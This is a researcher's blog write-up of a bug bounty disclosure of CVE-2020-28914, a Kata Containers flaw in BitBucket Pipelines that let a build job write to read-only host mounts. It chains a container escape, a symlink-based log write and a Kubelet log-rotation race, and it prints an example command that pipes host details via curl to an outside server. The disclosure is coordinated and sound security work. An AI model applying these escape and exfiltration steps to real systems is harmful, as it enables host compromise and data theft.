---
source: alex-chapman
source_url: https://blog.ajxchapman.com/posts/2021/02/28/kata-containers-escape.html
title: "BitBucket Pipelines Kata Containers Virtual Machine Escape | Alex Chapman’s Blog"
published: 2021-02-28T00:00:00-06:00
description: "Atlassian ran a project on Bugcrowd looking for bugs in their proposed implementation of Kata Containers within the BitBucket Pipelines CI/CD environment. Whilst participating in this project, I identified a vulnerability in Kata Containers which could allow processes running in the Kata VM to write to supposedly read-only volume mounts. This vulnerability was fixed by the Kata Containers team and"
---

Atlassian ran a project on Bugcrowd looking for bugs in their proposed implementation of [Kata Containers](https://katacontainers.io/) within the BitBucket Pipelines CI/CD environment. Whilst participating in this project, I identified a vulnerability in Kata Containers which could allow processes running in the Kata VM to write to supposedly read-only volume mounts. This vulnerability was fixed by the Kata Containers team and assigned [CVE-2020-28914](https://github.com/kata-containers/community/blob/master/VMT/KCSA/KCSA-CVE-2020-28914.md). Within the project Pipelines environment exploiting this vulnerability allowed a malicious build job to write semi-controlled data to arbitrary files on the host system as the `root`

user.

The following is an account of the discovery of this bug and an assessment of the impact of exploiting the bug in the project BitBucket Pipelines environment.

*Note: This post originally appeared on Bugcrowd’s blog it is re-posted here as the Bugcrowd post has suffered some format mangling and has been truncated, this appears to have occured during a blogging platform migration.*

## Introduction

BitBucket Pipelines is a CI/CD environment which runs build jobs from BitBucket repositories. Atlassian were trialing a new Pipelines build environment which used Kata Containers to attempt to logically separate the build jobs of different users. Kata Containers is an implementation of a CRI compatible container runtime which executes containers via Containerd within individual QEMU Virtual Machines (VMs). The goal of this new environment was to provide a higher level of security and separation than regular containerization in the event of a malicious build job escaping a build container.

In the new BitBucket Pipelines environment build jobs were executed as Kubernetes Pods with Kata Containers configured as the container runtime, causing each build job to be executed within separate Kata VMs.

Each build job consisted of several containers, a build container for running user provided build commands, several service containers for executing required Pipelines and build services, and a privileged Docker-in-Docker (DIND) container for executing Docker commands. All containers for an individual build job were executed in the same Kubernetes Pod within a single Kata VM.

In this environment no build job should be able to affect the output of another build job running on the same Kubernetes node, or be able to escape the Kata VM in order to compromise the node. My goal was to attempt to disprove these assertions.

## Bug Hunting

### Escaping to the Kata VM

From the build container, the Docker service running in the privileged DIND container could be used to launch further privileged containers*. Using the technique I previously described in [Privileged Container Escape - Control Groups release_agent](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html), the container environment could be escaped, permitting command execution as the `root`

user directly within the Kata VM. Whilst this was not a vulnerability as such, it was an important stepping stone to assist in finding bugs in the rest of the environment.

* *It should be noted that BitBucket Pipelines in production implements a Docker authorization plugin to prevent arbitrary Docker commands being run within the privileged DIND container, but for this project assessment that plugin was disabled.*

### Kata Containers ‘hostPath’ vulnerability discovery

Within the build container volume mounts could be discovered through the mounted file systems. In investigating the mounted paths I noticed several `kataShared`

mounts:

```
root@buildcont$ mount
...
kataShared on /etc/hostname type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
kataShared on /dev/termination-log type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
kataShared on /etc/hosts type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
kataShared on /etc/resolv.conf type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
kataShared on /usr/bin/docker type 9p (ro,dirsync,relatime,mmap,access=client,trans=virtio)
...
```


*Output truncated for readability.*

Reading the Kata Containers documentation I discovered that these mounts were `hostPath`

volumes from the container host via the Plan 9 Filesystem Protocol (9p). `hostPath`

volumes mount paths from the container host directly into the container.

One of the mounted paths looked particularly interesting, `/usr/bin/docker`

. The build container was configured to have the Docker client binary `hostPath`

mounted from the container host. I believe that this was a convenience to ensure that no matter what base image was used for the build container (the base image is user configurable), it would be able to access the DIND service without having to manually install the Docker client.

From the `mount`

output it could be clearly seen that the `/usr/bin/docker`

path was mounted read-only, and any attempt to write to this path would be denied by the Kernel.

Checking the mount points from the Kata VM showed that individual container mount points were not visible, only a single ‘parent’ mount point existed.

```
root@katavm$ mount
...
kataShared on /run/kata-containers/shared/containers type 9p (rw,nodev,relatime,dirsync,mmap,access=client,trans=virtio)
...
```


*Output truncated for readability.*

Under this path however, the individual container mounts were present as files and directories:

```
root@katavm$ ls -la /run/kata-containers/shared/containers
...
-rw-r--r-- 1 root root 43 Oct 26 11:47 6f727...b39fb-hostname
-rw-rw-rw- 1 root root 0 Oct 26 11:47 6f727...7097c-termination-log
-rw-r--r-- 1 root root 239 Oct 26 11:47 6f727...c5e0e-hosts
-rw-r--r-- 1 root root 42 Oct 26 11:47 6f727...268f9-resolv.conf
-rwxr-xr-x 1 root root 50683148 Jan 9 2019 6f727...4440e-docker
...
```


*File names and output truncated for readability.*

In an attempt to understand the mount process further, I set up a test Kubernetes environment on a VPS and configured Kata Containers as the container runtime. I then deployed a Pod with a read-only `hostPath`

volume as below:

```
apiVersion: apps/v1
kind: Deployment
metadata:
name: build-deployment
spec:
selector:
matchLabels:
app: build
template:
metadata:
labels:
app: build
spec:
runtimeClassName: kata
containers:
- name: build
image: alpine:latest
command: ["tail"]
args: ["-f", "/dev/null"]
volumeMounts:
- mountPath: /usr/bin/docker
name: docker
readOnly: true
volumes:
- name: docker
hostPath:
path: /opt/docker/bin/docker
```


Assessing the test environment I discovered that container `hostPath`

volumes followed a somewhat complicated mounting chain from the host to the target container, this is outlined below:

- The source mount path was
`bind`

mounted into the target Kata VM share directory on the container host (`/run/kata-containers/shared/sandboxes/<KataVM_ID>/shared/`

). - The Kata VM share directory was shared over a
`virtio-9p-pci`

device into the target Kata VM. - Within the Kata VM the
`virtio`

device was mounted to the container share directory (`/run/kata-containers/shared/containers`

). - The mount path was
`bind`

mounted from the container share directory into the destination container.

At this point I noted something odd:

```
root@host$ mount
...
/dev/vda1 on /run/kata-containers/shared/sandboxes/9619d...b411d/shared/7277c...f78c0-docker type ext4 (rw,relatime)
...
root@host$ cat /proc/self/mountinfo
...
3196 2875 252:1 /opt/docker/bin/docker /run/kata-containers/shared/sandboxes/9619d...b411d/shared/7277c...f78c0-docker rw,relatime master:1 - ext4 /dev/vda1 rw
...
```


*File names and output truncated for readability.*

The output above shows that even though the `docker`

mount was configured as read-only in the Pod YAML, it was bind mounted read-write into the Kata VM share directory. Despite this, it was ultimately being mounted read-only within the destination container. This implied that the read-only protection was being applied from within the Kata VM, meaning that the mount source could potentially be modified by commands running directly in the Kata VM.

Since command execution within the Kata VM had already been obtained (see section ‘Escaping to the Kata VM’ above), I tested this by writing to the supposedly read-only `docker`

binary.

```
root@katavm$ echo 1 > /run/kata-containers/shared/containers/7277c...f78c0-docker
```


*File names truncated for readability.*

The write was successful and the modified `docker`

binary could be seen from the container host.

```
root@host$ ls -la /opt/docker/bin/docker
-rwxr-xr-x 1 root root 2 Oct 26 18:16 /opt/docker/bin/docker
root@host$ cat /opt/docker/bin/docker
1
```


Moving back to the Pipelines environment, I confirmed I was able to modify the `docker`

binary on the container host, and have the modified binary affect another build, *very cool*!

Unfortunately through a bug in my PoC I managed to corrupt my backup of the `docker`

binary, breaking it for all other builds run on the node, *very not cool*!

It was here I decided to clean up as much as I could and open the initial [Bugcrowd report](https://bugcrowd.com/disclosures/7bf77429-2b94-44ea-b6f9-c1fc59b2fd17/host-docker-binary-overwrite-from-kata-vm) stating I may have DoSed the Pipelines environment and would provide a full report as soon as possible. I got a full report written up several hours later.

## Impact Assessment and Exploitation

I had identified that the `docker`

binary which was mounted into each build container on a node could be overwritten with malicious code. This could be exploited to modify the build output of other builds on the same node, but unfortunately it did not appear that this could be exploited to escape the Kata VM and execute commands on the container host, my ultimate goal.

Further assessment identified another read-only `hostPath`

volume which mounted the `/var/log/pods/$(NAMESPACE_NAME)_$(POD_NAME)_$(POD_ID)`

directory. This mount included container standard output logs for each container in the Pod. It appeared that this mount was used by an ‘agent’ container to report build and service container output to the Pipelines web UI.

Each container in the Pod had a separate subdirectory within the log directory, with the standard output of the container being written to `0.log`

under its subdirectory. Each line of output from the container was recorded, prepended with a time stamp, stream name and truncation status, such as below:

```
2020-10-29T12:49:35.410976914Z stdout F id
2020-10-29T12:49:35.503666526Z stdout F uid=0(root) gid=0(root) groups=0(root)
```


Looking for the `/var/log/pods`

directory in my test environment, I quickly identified that these logs were being written by the `containerd`

process running on the container host.

This second mount seemed more promising for escaping the Kata VM for three reasons:

- The source of the mount was a directory, not just a single file like the
`docker`

mount - The files in the directory were being written by a process running as the
`root`

user on the container host - The data written to the files could be at least partially controlled as it included the stdout of containers under the control of the build job

As I dug further into the potential avenues of exploitation for this issue I kept the Bugcrowd report updated with the new information I was discovering.

### Write Primitive

My first idea to exploit this log mount was to replace the current standard output log file for a test container with a symlink to another file, then have the container write controlled data to the standard output stream. Amazingly this worked first time, linking the `test/0.log`

file to `test/1.log`

resulted in the standard output stream for the ‘test’ container being written to the target `test/1.log`

file.

To prove the symlink destination was being written by a process on the container host (and not from within the Kata VM), I configured my test Kubernetes environment with a Pod mounting the `/var/log/pods/$(NAMESPACE_NAME)_$(POD_NAME)_$(POD_ID)`

directory and confirmed this technique would create new files on the container host outside of the mounted log directory.

At this point I could create any new files on the container host with `-rw-r-----`

permissions, owned by `root:root`

and with partially controlled data. Unfortunately however, it appeared that existing files could not be overwritten or appended to. Without the ability to append to existing files this issue would be more difficult to exploit, as the files that I could on the container host did not have ‘execute’ permissions.

### Append Primitive

For some unknown reason, when symlinking `test/0.log`

to an existing file Containerd would refuse to overwrite or append to the symlink target. This annoyed me more than it should, so I went looking through the Containerd source code on GitHub for why this might be.

It turned out that Containerd would ignore errors when writing container standard output log lines, and had no automatic method to reopen log files on error. I discovered that the write primitive above actually worked due to the log rotation code in Kubernetes Kublet. Every 10 seconds the Kubernetes `kubelet`

process would check the container standard output log directory for each running container. If the `0.log`

file did not exist, Kubelet would send a gRPC request to Containerd telling it to reopen the log file. However, in the case that `0.log`

had been symlinked to an existing file, Kublet saw the file existed and did not make the gRPC call, preventing Containerd from writing to the symlink location.

Looking over the Kubelet log rotation code, I discovered a possibility for appending to existing files. If `0.log`

was greater than 10MB, Kubelet would rotate `0.log`

to `0.log.<timestamp>`

and then send a gRPC request to Containerd telling it to reopen the `0.log`

file for logging.

```
func (c *containerLogManager) rotateLatestLog(id, log string) error {
timestamp := c.clock.Now().Format(timestampFormat)
rotated := fmt.Sprintf("%s.%s", log, timestamp)
if err := c.osInterface.Rename(log, rotated); err != nil {
return fmt.Errorf("failed to rotate log %q to %q: %v", log, rotated, err)
}
if err := c.runtimeService.ReopenContainerLog(id); err != nil {
```


This non-atomic operation across two processes contains a relatively simple race condition. If, after Kubelet has rotated `0.log`

but before Containerd has reopend `0.log`

, `0.log`

is created as a symlink to an existing file, Containerd will happily open the symlink destination and append all future log lines.

*Aside:* There is also a way to exploit the Kubelet log rotation behaviour to read files from the container host, but the details of this are left to be discovered by the reader.

### Exploitation (or lack thereof)

Now with the ability to append to arbitrary files on the container host, my plan was to identify a shell script likely to exist and append lines which would execute arbitrary shell commands. For example, executing the following in a container:

```
echo 'Run command \\$({ hostname; id; uname -a; } 2>&1 | curl -T - http://debug.webhooks.pw/log)'
```


Would result in the following lines being appended to the target shell script:

```
2020-11-02T08:43:34.846940623Z stdout F + echo 'Run command \\$({ hostname; id; uname -a; } 2>&1 | curl -T - http://debug.webhooks.pw/log)'
2020-11-02T08:43:34.846946507Z stdout F Run command \\$({ hostname; id; uname -a; } 2>&1 | curl -T - http://debug.webhooks.pw/log)
```


When executed from a `bash`

or `sh`

shell, the sub command `{ hostname; id; uname -a; } 2>&1 | curl -T - http://debug.webhooks.pw/log`

would be executed, which would record the output of the `hostname`

, `id`

and `uname -a`

commands to a webserver under my control. (Since sub-commands are evaluated before the ‘main’ command on a line in a shell script, it did not matter that the ‘main’ command, `2020-11-02T08:43:34.846946507Z`

in this instance, was not a valid shell command.)

Unfortunately between the time of the initial report and the Kata Containers fix being applied in the Pipelines environment I was unable to identify a suitable target shell script to write to on the container host. Ultimately however, the BitBucket team assessed the updated details provided and concluded that this issue could likely be exploited to execute commands on the container host as the `root`

user. Whilst this was a slightly disappointing end to this journey, I was happy with the response from the BitBucket team.

## Timeline

**20201026**- Initial Report**20201028**- Atlassian confirmed vulnerability**20201030**- Atlassian created bug report against Kata Containers project**20201030**- Further information provided**20201106**- Kata Containers PR merged**20201112**- Kata Containers fix released**20201117**- CVE-2020-28914 assigned**20201118**- Atlassian implemented fix

## Thanks

I want to thank both the Atlassian BitBucket and the Kata Containers teams for their quick responses to this issue.

## References

- Original Bugcrowd report:
[https://bugcrowd.com/disclosures/7bf77429-2b94-44ea-b6f9-c1fc59b2fd17/host-docker-binary-overwrite-from-kata-vm](https://bugcrowd.com/disclosures/7bf77429-2b94-44ea-b6f9-c1fc59b2fd17/host-docker-binary-overwrite-from-kata-vm) - CVE-2020-28914 details:
[https://github.com/kata-containers/community/blob/master/VMT/KCSA/KCSA-CVE-2020-28914.md](https://github.com/kata-containers/community/blob/master/VMT/KCSA/KCSA-CVE-2020-28914.md) - GitHub Issue:
[https://github.com/kata-containers/runtime/issues/3036](https://github.com/kata-containers/runtime/issues/3036) - GitHub Fix PR:
[https://github.com/kata-containers/kata-containers/pull/1062](https://github.com/kata-containers/kata-containers/pull/1062) - Kata Containers release with fix:
[https://github.com/kata-containers/runtime/releases/tag/1.11.5](https://github.com/kata-containers/runtime/releases/tag/1.11.5)